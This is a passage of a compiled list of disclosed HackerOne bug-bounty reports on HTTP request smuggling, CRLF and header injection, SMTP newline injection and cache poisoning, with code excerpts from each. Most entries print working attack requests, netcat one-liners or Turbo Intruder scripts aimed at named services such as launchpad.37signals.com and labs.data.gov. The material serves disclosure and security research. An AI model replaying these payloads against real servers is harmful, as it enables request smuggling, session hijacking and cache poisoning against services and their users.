printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" Transfer-Encoding: yeet\r\n"\
" Transfer-Encoding: \n"\
" Transfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```

## 89. [#1630336](https://hackerone.com/reports/1630336)  -  CVE-2022-32213 bypass via obs-fold mechanic
*medium*

```
Headers: {"host":"127.0.0.1:5000","user-agent":"curl/7.83.1","accept":"*/*","transfer-encoding":"chunked abc","content-type":"application/x-www-form-urlencoded"}
```

## 90. [#824753](https://hackerone.com/reports/824753)  -  Cache Poisoning
*high*

```html
<script>alert(document.domain)</script>
```

## 91. [#1204695](https://hackerone.com/reports/1204695)  -  RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
*high*

```html
<script>alert(1)</script>
```

## 92. [#1943013](https://hackerone.com/reports/1943013)  -  CRLF Inection at `██████████`
*low*

```
┌──(azab㉿kali)-[~]
└─$ curl -i ███████ 
HTTP/1.1 307 Temporary Redirect
Date: █████ █████████ GMT
Content-Type: text/html
Content-Length: 164
Connection: keep-alive
Server: nginx
Location: ████████
Set-Cookie: CRLF_Injection_By_ze2pac

<html>
<head><title>307 Temporary Redirect</title></head>
<body>
<center><h1>307 Temporary Redirect</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

## 93. [#1204695](https://hackerone.com/reports/1204695)  -  RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
*high*

```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nStatus: 500\r\n\r\n<script>alert(1)</script>"  # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

## 94. [#867577](https://hackerone.com/reports/867577)  -  Unauthenticated request smuggling on launchpad.37signals.com
*critical*

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

# … truncated …
```

## 95. [#2279572](https://hackerone.com/reports/2279572)  -  HTTP Response Header Injection in shopify/pitchfork + Rack 3
*low, $800*

```html
<script>alert(location)</script>
```

## 96. [#1509216](https://hackerone.com/reports/1509216)  -  SMTP Command Injection in Appointment Emails via Newlines
*medium*

```http
POST /apps/calendar/appointment/1/book HTTP/2
Host: 192.168.92.132

{"start":1647306900,"end":"1647307200","displayName":"Test User","email":"<BOOKING USER'S EMAIL>","description":"Please accept!\r\n","timeZone":"Asia/Singapore"}
```

## 97. [#726773](https://hackerone.com/reports/726773)  -  HTTP Request Smuggling on https://labs.data.gov
*high, $750*

```python
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(14):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
# … truncated …
```

## 98. [#965267](https://hackerone.com/reports/965267)  -  Potential HTTP Request Smuggling in ruby webrick
*low*

```python
def read_body(socket, block)
      return unless socket
      if tc = self['transfer-encoding']
        case tc
        when /chunked/io then read_chunked(socket, block)
        else raise HTTPStatus::NotImplemented, "Transfer-Encoding: #{tc}."
        end
      elsif self['content-length'] || @remaining_size
        @remaining_size ||= self['content-length'].to_i
        while @remaining_size > 0
          sz = [@buffer_size, @remaining_size].min
          break unless buf = read_data(socket, sz)
          @remaining_size -= buf.bytesize
          block.call(buf)
        end
        if @remaining_size > 0 && @socket.eof?
          raise HTTPStatus::BadRequest, "invalid body size."
        end
      elsif BODY_CONTAINABLE_METHODS.member?(@request_method)
        raise HTTPStatus::LengthRequired
      end
      return @body
    end
```

## 99. [#1204977](https://hackerone.com/reports/1204977)  -  CGI::Cookieクラスにおけるセキュリティ上好ましくない仕様および実装
*low*

```
path = "/;\r\n\r\n<script>alert(1)</script>"           # サンプルから path = の箇所を変更
```

## 100. [#3723248](https://hackerone.com/reports/3723248)  -  HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser
*medium*

```
${JSON.stringify(seen)}
```

## 101. [#3723248](https://hackerone.com/reports/3723248)  -  HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser
*medium*

```
${JSON.stringify([...response.matchAll(/HTTP\/1\.1 (\d+)/g)].map((m) => m[1]))}
```

## 102. [#1516377](https://hackerone.com/reports/1516377)  -  SMTP Command Injection in iCalendar Attachments to Emails via Newlines
*medium*

```http
PUT /remote.php/dav/calendars/nextcloud/personal/██████.ics HTTP/2
Host: 192.168.92.132

BEGIN:VCALENDAR
PRODID:-//Nextcloud Mail
BEGIN:VTIMEZONE
TZID:Asia/Singapore
BEGIN:STANDARD
TZOFFSETFROM:+0800
TZOFFSETTO:+0800
TZNAME:+08
DTSTART:19700101T000000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
CREATED:20220319T044448Z
DTSTAMP:20220319T080250Z
LAST-MODIFIED:20220319T080250Z
SEQUENCE:2
UID:a027641d-9f3a-4570-8cff-aa5cde0ba323
DTSTART;TZID=Asia/Singapore:20220322T100000
DTEND;TZID=Asia/Singapore:20220322T110000
STATUS:CONFIRMED
SUMMARY:Normal Event
ATTENDEE;CN=nextcloud;CUTYPE=INDIVIDUAL;PARTSTAT=DECLINED;ROLE=REQ-PARTICIP
 ANT;RSVP=TRUE;LANGUAGE=en:mailto:███
ORGANIZER;CN=Normal User:mailto:<ORGANIZER EMAIL>
END:VEVENT
END:VCALENDAR
```

## 103. [#2279572](https://hackerone.com/reports/2279572)  -  HTTP Response Header Injection in shopify/pitchfork + Rack 3
*low, $800*

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ cat Gemfile
# frozen_string_literal: true

source "https://rubygems.org"

gem 'pitchfork', '~> 0.10.0'%

❯ bundle install
=> install rack (3.0.8)
```

## 104. [#2279572](https://hackerone.com/reports/2279572)  -  HTTP Response Header Injection in shopify/pitchfork + Rack 3
*low, $800*

```ruby
class PitchForkHeaderInjection
  def call(env)
    params =  Rack::Request.new(env).params
    location = if params["mode"] == "rn"
                 ["a\r\nSet-cookie: injected=value"]
               elsif params["mode"] == "r"
                 ["b\rSet-cookie: injected_2=value2"]
               elsif params["mode"] == "n"
                 ["c\nSet-cookie: injected_3=value3"]
               elsif params["mode"] == "b"
                 ["d\r\n\r\n<script>alert(location)</script>"]
               else 
                  [""]
               end

    [ 200,
      {
       'content-type' => 'text/html',
        'location' => location
        },
      [""]
    ]
  end
end

run PitchForkHeaderInjection.new
```

## 105. [#1002188](https://hackerone.com/reports/1002188)  -  Potential HTTP Request Smuggling in nodejs
*low, $250*

```
var express = require('express');
var app = express();
var bodyParser = require('body-parser')

app.use(bodyParser())

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.get('/flag', function (req, res) {
    res.send('flag is 1a2b3c4d5e6f');
});

app.post('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});
```

## 106. [#824753](https://hackerone.com/reports/824753)  -  Cache Poisoning
*high*

```
echo -e "GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
nc: using stream socket
HTTP/1.1 200 Gatewaying
Server: squid/4.9
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 15:57:04 GMT
Content-Type: text/plain
Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT
Age: 79
X-Cache: HIT from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.9)
Connection: keep-alive

23
Hello! This is from my ftp server.

0
```

## 107. [#824753](https://hackerone.com/reports/824753)  -  Cache Poisoning
*high*

```
echo -e "GET ftp://hackerone.com/?@192.168.122.1:8080/payload HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

nc: using stream socket
HTTP/1.1 200 Gatewaying
Server: squid/4.9
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 15:57:04 GMT
Content-Type: text/plain
Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT
Age: 249
X-Cache: HIT from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.9)
Connection: keep-alive

23
Hello! This is from my ftp server.

0
```

## 108. [#2032842](https://hackerone.com/reports/2032842)  -  HTTP Request Smuggling via Empty headers separated by CR
*medium, $1,800*

```
Response
{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }
A
---
```

## 109. [#3723248](https://hackerone.com/reports/3723248)  -  HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser
*medium*

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close\r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

## 110. [#3723248](https://hackerone.com/reports/3723248)  -  HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser
*medium*

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close \r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

## 111. [#3723248](https://hackerone.com/reports/3723248)  -  HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser
*medium*

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close\t\r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

## 112. [#3648681](https://hackerone.com/reports/3648681)  -  Improper Input Validation  -  HTTP Response Parser Unconditionally Accepts Bare CR in Status Line
*medium*

```
Status: 200
Headers: {"content-length":"4"}
Body: Evil
```

## 113. [#3648681](https://hackerone.com/reports/3648681)  -  Improper Input Validation  -  HTTP Response Parser Unconditionally Accepts Bare CR in Status Line
*medium*

```json
[PROXY] 🔴 BARE CR detected at offset 15!
[PROXY] STRICT PARSING: \r\r is INVALID per RFC 7230 §3.1.2
[PROXY] → Response is COMPLETE (no headers, no body)
[PROXY] Keeping 28 bytes as ORPHAN DATA
[PROXY]   Orphan hex: 436f6e74656e742d4c656e6774683a20360d0a0d0a48656c6c6f2041

[CLIENT A] Contains "Hello A": false
[CLIENT A] 🔴 Body was STRIPPED by proxy!

[PROXY] ⚠️  PREPENDING 28 bytes of ORPHAN DATA to request!
[BACKEND] Request #3: Content-Length: 6
[BACKEND] 🔴 GARBLED REQUEST LINE! Orphan data was prepended!
[BACKEND]   "Content-Length: 6\r\n\r\nHello AGET /page2 HTTP/1.1\r\n..."

[CLIENT B] 🔴🔴🔴 DESYNC CONFIRMED! 🔴🔴🔴
[CLIENT B] Got 400 Bad Request because:
[CLIENT B]   Proxy prepended orphan data to Client B's request
[CLIENT B]   Backend received garbled request → 400!
```

## 114. [#1524692](https://hackerone.com/reports/1524692)  -  HTTP Request Smuggling Due To Improper Delimiting of Header Fields
*medium*

```http
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 124

{"URL":"/","Headers":{"host":"localhost","dummy":"x","content-length":"23"},"Length":23,"Body":"GET / HTTP/1.1\r\nDummy: "}
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 69

{"URL":"/admin","Headers":{"host":"localhost"},"Length":0,"Body":""}
```

## 115. [#1501679](https://hackerone.com/reports/1501679)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding
*medium*

```http
HTTP/1.1 200 OK
Date: Sun, 06 Mar 2022 03:34:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 77

{"Headers":{"transfer-encoding":"chunked , identity"},"Length":1,"Body":"a"}
```

## 116. [#1524555](https://hackerone.com/reports/1524555)  -  HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding
*medium*

```http
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:02:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 92

{"Headers":{"host":"localhost","transfer-encoding":"chunkedchunked"},"Length":1,"Body":"a"}
```

## 117. [#1665156](https://hackerone.com/reports/1665156)  -  HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding (improper fix for CVE-2022-32215)
*medium*

```
HTTP/1.1 200 OK
Date: Sun, 06 Mar 2022 03:34:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 101

{"Headers":{"transfer-encoding":"chunked , chunked-false"},"Length":1,"Body":"A"}
HTTP/1.1 200 OK
Date: Sun, 06 Mar 2022 03:34:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 64

{"Headers":{"host":"127.0.0.1", "foo":"x"},"Length":0,"Body":""}
```

## 118. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 02:59:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
```

## 119. [#1675191](https://hackerone.com/reports/1675191)  -  HTTP Request Smuggling Due to Incorrect Parsing of Header Fields
*medium*

```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 03:06:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
Response
{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }
A
```

## 120. [#2279572](https://hackerone.com/reports/2279572)  -  HTTP Response Header Injection in shopify/pitchfork + Rack 3
*low, $800*

```ruby
def append_header(buf, key, value)
      case value
      when Array # Rack 3
        value.each { |v| buf << "#{key}: #{v}\r\n" }
      when /\n/ # Rack 2
        # avoiding blank, key-only cookies with /\n+/
        value.split(/\n+/).each { |v| buf << "#{key}: #{v}\r\n" }
      else
        buf << "#{key}: #{value}\r\n"
      end
    end
```

## 121. [#2147132](https://hackerone.com/reports/2147132)  -  Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter
*low, $200*

```
HTTP/2 302
server: nginx
date: Tue, 21 Feb 2023 12:04:22 GMT
content-length: 0
content-security-policy: default-src 'self'; worker-src 'none'; connect-src 'self' https://product-details.mozilla.org https://www.google-analytics.com https://treeherder.mozilla.org/api/failurecount/ https://crash-stats.mozilla.org/api/SuperSearch/; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://secure.gravatar.com; object-src 'none'; script-src 'self' 'nonce-kYhs2ysp5D5M1gt2i2uKTFaJyxLN8Qm7O112v7Vt6J4dWGrf' 'unsafe-inline' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; frame-src https://crash-stop-addon.herokuapp.com; frame-ancestors 'self'; form-action 'self' https://www.google.com/search https://github.com/login/oauth/authorize https://github.com/login https://phabricator.services.mozilla.com/ https://people.mozilla.org
location:
xxx: something?error=invalid_scope
referrer-policy: same-origin
strict-transport-security: max-age=31536000; includeSubDomains
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
# … truncated …
```

## 122. [#1063493](https://hackerone.com/reports/1063493)  -  HTTP Request Smuggling on https://promosandbox.acronis.com
*low*

```
socat -v -d -d TCP-LISTEN:443,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: https://pqp.mx:8443";/bin/echo;/bin/echo'
```
